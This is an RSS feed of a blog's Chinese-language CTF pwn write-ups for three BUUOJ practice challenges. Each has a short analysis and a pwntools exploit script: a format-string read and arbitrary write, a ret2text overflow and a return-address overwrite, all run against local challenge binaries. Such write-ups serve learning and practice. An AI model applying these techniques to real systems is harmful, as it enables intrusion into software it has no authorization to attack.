<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Buuoj on</title><link>https://c3n1gbr0k3n.github.io/writeup/buuoj/</link><description>Recent content in Buuoj on</description><generator>Hugo -- gohugo.io</generator><lastBuildDate>Wed, 29 Mar 2023 04:25:34 +0800</lastBuildDate><atom:link href="https://c3n1gbr0k3n.github.io/writeup/buuoj/index.xml" rel="self" type="application/rss+xml"/><item><title>[第五空间 2019 决赛] PWN5</title><link>https://c3n1gbr0k3n.github.io/writeup/buuoj/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4_2019_%E5%86%B3%E8%B5%9B_pwn5/</link><pubDate>Thu, 06 Apr 2023 19:15:01 +0800</pubDate><guid>https://c3n1gbr0k3n.github.io/writeup/buuoj/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4_2019_%E5%86%B3%E8%B5%9B_pwn5/</guid><description>0x01 分析 # 思路很清晰，利用格式化任意写可以覆盖随机值为指定值，然后就可以输入指定值了
或者也可以读取这个随机值（通过%s读取，只要里面没有 \x00 即可）
跟在随机值存储位置后面的就是随机值
0x02 Exploit # from pwn import* context.log_level = 'debug' o = process(&amp;quot;./pwn5&amp;quot;) payload = p32(0x804C044) + &amp;quot;%10$s&amp;quot; o.sendline(payload) o.recvuntil(p32(0x804C044)) res = u32(o.recv(4)) log.info(hex(res)) o.sendline(str(res).encode()) o.interactive() 覆盖的脚本为
from pwn import* o = process(&amp;quot;./pwn5&amp;quot;) payload = p32(0x804C044) + &amp;quot;%10$n&amp;quot; o.sendline(payload) o.sendline(b'4') o.interactive()</description></item><item><title>warmup_csaw_2016</title><link>https://c3n1gbr0k3n.github.io/writeup/buuoj/warmup_csaw_2016/</link><pubDate>Thu, 30 Mar 2023 22:51:11 +0800</pubDate><guid>https://c3n1gbr0k3n.github.io/writeup/buuoj/warmup_csaw_2016/</guid><description>0x01 分析 # 存在溢出点，而且程序里有直接获取flag的函数
直接简单的ret2text即可拿到flag
Exploit # from pwn import* o = process(&amp;quot;./pwn&amp;quot;) payload = b'a'*72 + p64(0x40060D) o.sendline(payload) o.interactive()</description></item><item><title>ciscn_2019_n_1</title><link>https://c3n1gbr0k3n.github.io/writeup/buuoj/ciscn_2019_n_1/</link><pubDate>Wed, 29 Mar 2023 04:25:55 +0800</pubDate><guid>https://c3n1gbr0k3n.github.io/writeup/buuoj/ciscn_2019_n_1/</guid><description>0x01 分析 # 存在溢出点，可以直接覆盖函数返回地址为 system(&amp;quot;cat /flag&amp;quot;)
0x02 Exploit # from pwn import* o = process(&amp;quot;./pwn&amp;quot;) payload = b'a'*56 + p32(0x4006BE) o.sendline(payload) o.interactive()</description></item></channel></rss>